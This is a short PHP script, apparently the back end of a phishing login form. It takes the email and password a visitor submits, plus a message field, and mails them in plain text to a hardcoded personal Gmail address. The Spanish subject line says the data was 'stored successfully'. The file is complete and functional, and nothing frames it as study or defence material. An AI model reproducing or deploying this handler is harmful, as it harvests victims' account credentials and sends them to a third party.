<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $email = $_POST['email'];
  $password = $_POST['password'];
  $mensaje = $_POST['mensaje'];
  
  $destinatario = 'jeirex12mis@gmail.com';
  $asunto = 'Tus datos se han almacenado con exito! ';
  $contenido = "email: $email\npassword: $password\nMensaje: $mensaje";
  
  if (mail($destinatario, $asunto, $contenido)) {
    echo 'Mensaje enviado correctamente';
  } else {
    echo 'Error al enviar el mensaje';
  }
}
?>